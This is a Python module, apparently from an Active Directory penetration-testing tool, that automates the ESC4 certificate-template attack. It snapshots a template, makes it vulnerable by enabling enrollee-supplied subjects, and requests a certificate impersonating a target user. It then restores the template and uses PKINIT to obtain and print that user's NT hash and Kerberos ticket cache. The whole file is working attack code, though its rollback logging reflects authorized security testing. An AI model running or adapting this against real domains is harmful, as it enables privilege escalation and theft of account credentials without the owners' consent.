"""ESC4 — write-level ACL on CertTemplate → mutate → ESC1 flow → restore."""
from __future__ import annotations

import asyncio
from pathlib import Path

from adscan_internal.rich_output import print_error, print_info, print_success
from adscan_internal.services.adcs.cert_request import CertRequestConfig, request_certificate_native
from adscan_internal.services.adcs.cert_auth import CertAuthConfig, authenticate_with_cert_native
from adscan_internal.services.adcs.template_modify import (
    snapshot_template,
    make_template_esc1_vulnerable,
    restore_template,
    write_snapshot_to_disk,
)
from adscan_internal.services.adcs.esc_types import EscConfig, EscResult
from adscan_internal.services.adcs.esc_cleanup import (
    esc_rollback_scope,
    register_ldap_change,
    mark_reverted,
    mark_revert_failed,
)


def _output_dir(config: EscConfig) -> Path:
    d = Path(config.workspace_dir or "/tmp") / "adcs" / "esc4"
    d.mkdir(parents=True, exist_ok=True)
    return d


async def run_esc4(config: EscConfig) -> EscResult:
    """ESC4: snapshot template → mutate → enroll (ESC1 path) → restore."""
    out = _output_dir(config)
    template = config.template or ""

    # 1. Snapshot — refuse to mutate without one
    print_info(f"ESC4: snapshotting template {template}...")
    snap = await asyncio.to_thread(
        snapshot_template,
        domain=config.auth_domain,
        dc_ip=config.dc_ip,
        username=config.username,
        password=config.effective_secret or "",
        template_name=template,
        dc_fqdn=None,
    )
    if snap is None:
        return EscResult(
            success=False,
            esc=4,
            error=f"Could not snapshot template {template} — check rights or template name",
        )

    snap_path = out / f"{template}.adscan.snapshot.json"
    write_snapshot_to_disk(snap, snap_path)

    change_id = register_ldap_change(
        config.shell,
        kind="template_mutated",
        domain=config.domain,
        target=f"CertTemplate/{template}",
        detail={"template": template, "snapshot_path": str(snap_path)},
        method="ADCSESC4 — template mutation",
    )

    restored = False

    async with esc_rollback_scope() as rb:

        async def _restore() -> None:
            nonlocal restored
            print_info(f"ESC4: restoring template {template}...")
            ok, err = await asyncio.to_thread(
                restore_template,
                domain=config.auth_domain,
                dc_ip=config.dc_ip,
                username=config.username,
                password=config.effective_secret or "",
                snapshot=snap,
                dc_fqdn=None,
            )
            if ok:
                restored = True
                mark_reverted(config.shell, change_id)
                print_success(f"ESC4: template {template} restored.")
            else:
                mark_revert_failed(
                    config.shell,
                    change_id,
                    error=str(err),
                    instructions=f"Manually restore template {template} using snapshot at {snap_path}",
                )
                print_error(f"ESC4: template restore failed: {err}")

        rb.add(_restore)

        # 2. Mutate — raises on failure; rollback scope calls _restore automatically
        print_info(f"ESC4: enabling ENROLLEE_SUPPLIES_SUBJECT on {template}...")
        ok_mut, err_mut = await asyncio.to_thread(
            make_template_esc1_vulnerable,
            domain=config.auth_domain,
            dc_ip=config.dc_ip,
            username=config.username,
            password=config.effective_secret or "",
            snapshot=snap,
            dc_fqdn=None,
        )
        if not ok_mut:
            raise RuntimeError(f"Template mutation failed: {err_mut}")

        # 3. Request cert (ESC1 path on now-vulnerable template)
        print_info(f"ESC4: requesting certificate as {config.target_upn}...")
        _esc4_key_size = getattr(config, "min_key_size", None)
        req_cfg = CertRequestConfig(
            domain=config.auth_domain,
            kdc_ip=config.auth_kdc,
            ca_host=config.ca_host,
            ca_name=config.ca_name,
            template=template,
            username=config.username,
            password=config.effective_secret,
            upn=config.target_upn,
            ca_fqdn=config.ca_fqdn,
            dns_server=config.dns_server,
            ledger_shell=config.shell,
            ledger_domain=config.domain,
            ledger_technique="ADCSESC4 — certificate enrollment on the mutated template",
            **({} if _esc4_key_size is None else {"key_size": int(_esc4_key_size)}),
        )
        req = await request_certificate_native(req_cfg, out)
        if not req.success:
            await _restore()
            return EscResult(
                success=False,
                esc=4,
                error=f"Certificate request failed: {req.error}",
                rollback_ok=restored,
            )

        # 4. Restore before PKINIT so template is clean regardless of auth outcome
        await _restore()

        # 5. PKINIT
        auth_cfg = CertAuthConfig(
            domain=config.domain,
            kdc_ip=config.dc_ip,
            pfx_path=req.pfx_path,
            pfx_password=req.pfx_password or "",
            username=config.target_upn.split("@")[0] if config.target_upn else None,
        )
        auth = await authenticate_with_cert_native(auth_cfg, out)
        if not auth.success:
            return EscResult(
                success=False,
                esc=4,
                error=auth.error or "PKINIT failed",
                rollback_ok=restored,
            )

        print_success(f"ESC4: NT hash obtained — {auth.nt_hash}")
        from adscan_internal.services.adcs.esc_enrollment import _emit_pkinit_compromise

        _emit_pkinit_compromise(config, auth.nt_hash)
        return EscResult(
            success=True,
            esc=4,
            nt_hash=auth.nt_hash,
            ccache_path=str(auth.ccache_path) if auth.ccache_path else None,
            pfx_path=str(req.pfx_path),
            rollback_ok=restored,
        )
